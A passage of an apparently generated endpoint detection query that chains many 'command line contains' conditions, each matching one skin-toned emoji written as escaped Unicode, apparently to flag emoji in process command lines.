\"\ud83e\uddd6\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc83\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udd7a\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udd74\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc6c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc6b\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc7\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfc2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffc\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udec0\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udecc\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc4b\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd1a\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udd90\ud83c\udffd\" or tgt.process.cmdline contains \"\u270b\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udd96\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc4c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd0c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd0f\ud83c\udffd\" or tgt.process.cmdline contains \"\u270c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd1e\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd1f\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd18\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd19\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc48\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc49\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc46\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udd95\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc47\ud83c\udffd\" or tgt.process.cmdline contains \"\u261d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc4d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc4e\ud83c\udffd\" or tgt.process.cmdline contains \"\u270a\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc4a\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd1b\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd1c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc4f\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude4c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc50\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd32\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude4f\ud83c\udffd\" or tgt.process.cmdline contains \"\u270d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udcaa\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddb5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddb6\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc42\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddbb\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc43\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc76\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc67\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc66\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc75\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc74\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc72\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc78\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd34\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd77\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd36\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf85\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc7c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd30\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd31\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc83\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udd7a\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udd74\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc6c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc6b\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc7\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfc2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffd\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains 